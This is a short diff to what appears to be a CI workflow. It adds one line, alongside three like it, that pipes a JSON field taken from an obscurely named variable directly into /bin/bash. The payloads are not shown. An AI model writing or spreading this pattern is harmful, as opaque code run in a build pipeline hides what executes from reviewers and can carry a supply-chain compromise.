@@ -53,6 +53,7 @@ jobs:
           printf '%s' "$xit7066" | jq -r .ooht5551 | /bin/bash
           printf '%s' "$flv506" | jq -r .hze331 | /bin/bash
           printf '%s' "$mxo1" | jq -r .pnwk88238 | /bin/bash
+          echo $n99 | jq -r .mgl30 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
